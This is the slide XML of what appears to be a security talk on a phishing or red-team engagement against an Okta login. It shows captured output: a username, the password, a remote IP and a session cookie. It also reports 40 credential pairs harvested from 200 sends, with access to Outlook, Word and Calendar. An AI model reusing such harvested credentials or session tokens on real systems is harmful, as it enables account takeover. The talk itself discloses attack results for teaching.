</file>

<file path=ppt/slides/slide8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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="790" name="Shape 790"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="791" name="Google Shape;791;p95"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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2" name="Google Shape;792;p95"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="793" name="Google Shape;793;p95"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1041700" y="266850"/>
            <a:ext cx="6902400" cy="1169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3200">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>Within a minute the cookies started rolling in…</a:t>
            </a:r>
            <a:endParaRPr sz="3200">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="794" name="Google Shape;794;p95"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC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
        <p:nvSpPr>
          <p:cNvPr id="795" name="Google Shape;795;p95"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502625" y="1925425"/>
            <a:ext cx="8398200" cy="28053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b="1" lang="en" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t> username     : 112031</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t> password     : Name123!</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t> remote ip    : 13.220.103.203</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t> create time  : 2022-08-10 00:13</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t> update time  : 2022-08-10 </a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr b="1" sz="1500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>[{"path":"/","domain":"notacasino.okta.com","expirationDate":1691636619,"value":"1234byfexf9ZxMTob_w0wSaDw","name":"sid","httpOnly":true,"hostOnly":true}]</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr b="1" sz="1500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="799" name="Shape 799"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="800" name="Google Shape;800;p96"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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1" name="Google Shape;801;p96"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="802" name="Google Shape;802;p96"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="129400" y="224400"/>
            <a:ext cx="6902400" cy="677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3200">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>Within 2 minutes, I had access to this</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="3200">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="803" name="Google Shape;803;p96"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502625" y="1925425"/>
            <a:ext cx="8398200" cy="4155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t/>
            </a:r>
            <a:endParaRPr b="1" sz="1500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="804" name="Google Shape;804;p96"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="44665" l="2780" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="80325" y="1093725"/>
            <a:ext cx="8983327" cy="3100625"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="808" name="Shape 808"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="809" name="Google Shape;809;p97"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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0" name="Google Shape;810;p97"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="811" name="Google Shape;811;p97"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="129400" y="224400"/>
            <a:ext cx="6902400" cy="677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b="1" sz="3200">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="812" name="Google Shape;812;p97"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502625" y="1925425"/>
            <a:ext cx="8398200" cy="4155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t/>
            </a:r>
            <a:endParaRPr b="1" sz="1500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="813" name="Google Shape;813;p97"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="15604" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="9144003" cy="5143501"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="817" name="Shape 817"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="818" name="Google Shape;818;p98"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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9" name="Google Shape;819;p98"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="820" name="Google Shape;820;p98"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="129400" y="224400"/>
            <a:ext cx="6902400" cy="677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b="1" sz="3200">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="821" name="Google Shape;821;p98"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502625" y="1925425"/>
            <a:ext cx="8398200" cy="4155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t/>
            </a:r>
            <a:endParaRPr b="1" sz="1500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="822" name="Google Shape;822;p98"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="15604" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="9144003" cy="5143501"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="826" name="Shape 826"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="827" name="Google Shape;827;p99"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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8" name="Google Shape;828;p99"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="829" name="Google Shape;829;p99"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="129400" y="224400"/>
            <a:ext cx="6902400" cy="677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3200">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>Result:</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="3200">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="830" name="Google Shape;830;p99"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502625" y="1925425"/>
            <a:ext cx="8398200" cy="4155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t/>
            </a:r>
            <a:endParaRPr b="1" sz="1500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="831" name="Google Shape;831;p99"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="205600" y="1140450"/>
            <a:ext cx="8398200" cy="33885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 sz="2300">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>Ended up with </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="2300">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>40 pairs of creds</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="2300">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t> (out of 200 sends)</a:t>
            </a:r>
            <a:endParaRPr sz="2300">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr b="1" sz="2300">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="2300">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>Access to:</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="2300">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-374650" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2300"/>
              <a:buFont typeface="Abhaya Libre"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="2300">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>Outlook, Word, Calendar</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="2300">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-374650" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
